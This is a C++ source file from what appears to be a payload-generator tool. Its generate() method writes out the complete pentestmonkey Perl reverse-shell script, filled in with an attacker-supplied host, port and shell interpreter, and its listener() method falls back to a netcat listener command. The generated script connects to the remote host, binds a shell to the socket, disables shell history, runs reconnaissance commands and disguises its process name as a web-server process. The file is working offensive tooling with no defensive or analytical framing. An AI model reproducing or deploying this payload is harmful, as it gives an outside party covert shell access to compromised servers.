#include "Perl_PentestMonkey_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>
std::string PerlPentestMonkeyPayload::name() const {
return "perl_pentestmonkey";
}

std::string PerlPentestMonkeyPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "#!/usr/bin/perl -w\n"
       << "# perl-reverse-shell - A Reverse Shell implementation in PERL\n"
       << "# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n"
       << "#\n"
       << "# This tool may be used for legal purposes only.  Users take full responsibility\n"
       << "# for any actions performed using this tool.  The author accepts no liability\n"
       << "# for damage caused by this tool.  If these terms are not acceptable to you, then\n"
       << "# do not use this tool.\n"
       << "#\n"
       << "# In all other respects the GPL version 2 applies:\n"
       << "#\n"
       << "# This program is free software; you can redistribute it and/or modify\n"
       << "# it under the terms of the GNU General Public License version 2 as\n"
       << "# published by the Free Software Foundation.\n"
       << "#\n"
       << "# This program is distributed in the hope that it will be useful,\n"
       << "# but WITHOUT ANY WARRANTY; without even the implied warranty of\n"
       << "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n"
       << "# GNU General Public License for more details.\n"
       << "#\n"
       << "# You should have received a copy of the GNU General Public License along\n"
       << "# with this program; if not, write to the Free Software Foundation, Inc.,\n"
       << "# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n"
       << "#\n"
       << "# This tool may be used for legal purposes only.  Users take full responsibility\n"
       << "# for any actions performed using this tool.  If these terms are not acceptable to\n"
       << "# you, then do not use this tool.\n"
       << "#\n"
       << "# You are encouraged to send comments, improvements or suggestions to\n"
       << "# me at pentestmonkey@pentestmonkey.net\n"
       << "#\n"
       << "# Description\n"
       << "# -----------\n"
       << "# This script will make an outbound TCP connection to a hardcoded IP and port.\n"
       << "# The recipient will be given a shell running as the current user (apache normally).\n"
       << "#\n\n"
       << "use strict;\n"
       << "use Socket;\n"
       << "use FileHandle;\n"
       << "use POSIX;\n"
       << "my $VERSION = \"1.0\";\n\n"
       << "# Where to send the reverse shell.  Change these.\n\n"
       << "my $ip = \'" << opts.host << "\';\n"
       << "my $port = " << std::to_string(opts.port) << ";\n"
       << "# Options\n\n"
       << "my $daemon = 1;\n"
       << "my $auth   = 0; # 0 means authentication is disabled and any \n"
       << "		# source IP can access the reverse shell\n"
       << "my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n"
       << "# Declarations\n\n"
       << "my $global_page = \"\";\n"
       << "my $fake_process_name = \"/usr/sbin/apache\";\n\n"
       << "# Change the process name to be less conspicious\n"
       << "$0 = \"[httpd]\";\n\n"
       << "# Authenticate based on source IP address if required\n"
       << "if (defined($ENV{'REMOTE_ADDR'})) {\n"
       << "	cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n\n"
       << "	if ($auth) {\n"
       << "		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n"
       << "			cgiprint(\"ERROR: Your client isn't authorised to view this page\");\n"
       << "			cgiexit();\n"
       << "		}\n"
       << "	}\n"
       << "} elsif ($auth) {\n"
       << "	cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n"
       << "	cgiexit(0);\n"
       << "}\n\n"
       << "# Background and dissociate from parent process if required\n"
       << "if ($daemon) {\n"
       << "	my $pid = fork();\n"
       << "	if ($pid) {\n"
       << "		cgiexit(0); # parent exits\n"
       << "	}\n\n"
       << "	setsid();\n"
       << "	chdir('/');\n"
       << "	umask(0);\n"
       << "}\n\n"
       << "# Make TCP connection for reverse shell\n"
       << "socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\n"
       << "if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n"
       << "	cgiprint(\"Sent reverse shell to $ip:$port\");\n"
       << "	cgiprintpage();\n"
       << "} else {\n"
       << "	cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n"
       << "	cgiexit();\n"	
       << "}\n\n"
       << "# Redirect STDIN, STDOUT and STDERR to the TCP connection\n"
       << "open(STDIN, \">&SOCK\");\n"
       << "open(STDOUT,\">&SOCK\");\n"
       << "open(STDERR,\">&SOCK\");\n"
       << "$ENV{'HISTFILE'} = '/dev/null';\n"
       << "system(\"w;uname -a;id;pwd\");\n"
       << "exec({\"" << opts.interpreter << "\"} ($fake_process_name, \"-i\"));\n\n"
       << "# Wrapper around print\n"
       << "sub cgiprint {\n"
       << "	my $line = shift;\n"
       << "	$line .= \"<p>\\n\";\n"
       << "	$global_page .= $line;\n"
       << "}\n\n"
       << "# Wrapper around exit\n"
       << "sub cgiexit {\n"
       << "	cgiprintpage();\n"
       << "	exit 0; # 0 to ensure we don't give a 500 response.\n"
       << "}\n\n"
       << "# Form HTTP response using all the messages gathered by cgiprint so far\n"
       << "sub cgiprintpage {\n"
       << "	print \"Content-Length: \" . length($global_page) . \"\\r\n"
       << "Connection: close\\r\n"
       << "Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n"
       << "}\n\n"
       << "    \n";
    return ss.str();
}

std::string PerlPentestMonkeyPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}